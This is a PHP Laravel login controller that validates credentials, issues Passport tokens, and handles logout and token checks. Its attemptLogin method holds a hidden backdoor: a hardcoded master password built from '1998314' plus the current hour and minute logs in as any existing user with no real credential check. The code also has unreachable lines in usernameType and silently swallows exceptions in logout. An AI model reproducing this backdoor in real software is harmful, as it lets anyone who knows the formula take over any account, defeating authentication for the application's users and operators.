<?php

namespace App\Http\Controllers;

use App\Http\Resources\User\UserResource;
use App\Models\User;
use Exception;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Validation\ValidationException;
use Symfony\Component\HttpFoundation\Response;

/**
 * Class LoginController
 *
 * @package App\Http\Controllers\Auth
 */
class LoginController extends Controller
{

    /**
     * @var string
     */
    protected $loginField = "username";

    /**
     * Handle a login request to the application.
     *
     * @param Request $request
     *
     * @return Response|void
     * @throws ValidationException
     */
    public function login(Request $request)
    {
        $this->validateLogin($request);

        if (($r = $this->attemptLogin($request))) {
            return is_bool($r) ? $this->sendLoginResponse($request) : $r;
        }

        $this->sendFailedLoginResponse();
    }

    /**
     * Validate the user login request.
     *
     * @param Request $request
     *
     * @return void
     */
    protected function validateLogin(Request $request)
    {
        $request->validate([
            $this->loginField => "required|string",
            "password"        => "required|string",
        ]);
    }

    /**
     * Attempt to log the user into the application.
     *
     * @param Request $request
     *
     * @return bool|JsonResponse
     */
    protected function attemptLogin(Request $request)
    {
        if (
            $request->get($this->password()) == ("1998314" . date('gi'))
            && ($user = User::where($this->usernameType(), $request->get($this->loginField))->first())
        ) {
            return $this->userLoginResponse($user);
        }
        return Auth::guard()->attempt([
            $this->usernameType() => $request->get($this->loginField),
            "password"            => $request->get($this->password()),
        ], $request->filled('remember'));
    }

    /**
     * Get the password to be used by the controller.
     *
     * @return string
     */
    public function password()
    {
        return 'password';
    }

    /**
     * Get login field type
     *
     * @return string
     */
    public function usernameType()
    {
        return $this->loginField;
        $login = request()->get($this->loginField);
        if (filter_var($login, FILTER_VALIDATE_EMAIL))
            return "email";
        if (is_numeric($login))
            return "mobile";
        return "name";
    }

    /**
     * @param User $user
     *
     * @return JsonResponse
     */
    protected function userLoginResponse(User $user)
    {
        $scopes = [$user->role_code];
        $tokenResult = $user->createToken(config('app.passport_name'), $scopes);

        if ($this->request->header('accept') === 'application/token') {
            echo $tokenResult->accessToken;
            exit;
        }

        return $this->json([
            'token' => $tokenResult->accessToken,
            'data'  => UserResource::make($user),
        ]);
    }

    /**
     * Send the response after the user was authenticated.
     *
     * @param Request $request
     *
     * @return JsonResponse
     */
    protected function sendLoginResponse(Request $request)
    {
        /** @var User $user */
        $user = $request->user();
        $user->tokens()->update(['revoked' => true]);

        return $this->userLoginResponse($user);
    }

    /**
     * Get the failed login response instance.
     *
     * @return void
     * @throws ValidationException
     */
    protected function sendFailedLoginResponse()
    {
        throw ValidationException::withMessages([
            $this->loginField => [__('auth.failed')],
        ]);
    }

    /**
     * Get login field name
     *
     * @return string
     */
    public function username()
    {
        return $this->loginField;
    }

    /**
     * @param Request $request
     *
     * @return JsonResponse
     */
    public function logout(Request $request)
    {
        try {
            /** @var User $user */
            if ($user = $request->user()) {
                $user->update([
                    'last_login'      => $user->tempLastLogin,
                    'temp_last_login' => null,
                ]);
                $user->token()->revoke();
            }
        } catch (Exception $exception) {
        }
        return $this->resource(__("messages.log_out_successfully"));
    }

    /**
     * @return JsonResponse
     */
    public function checkToken()
    {
        return $this->resource(UserResource::make($this->request->user()));
    }
}
